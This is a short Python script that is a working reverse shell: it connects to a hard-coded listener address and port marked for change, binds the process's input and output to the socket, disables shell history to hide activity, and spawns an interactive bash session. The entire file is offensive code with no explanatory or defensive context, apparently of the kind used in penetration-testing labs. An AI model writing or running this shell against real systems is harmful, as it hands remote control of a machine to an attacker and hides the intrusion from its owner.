import os
import pty
import socket

lhost = "10.10.14.71" # XXX: CHANGEME
lport = 4444 # XXX: CHANGEME

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
	
if __name__ == "__main__":
    main()
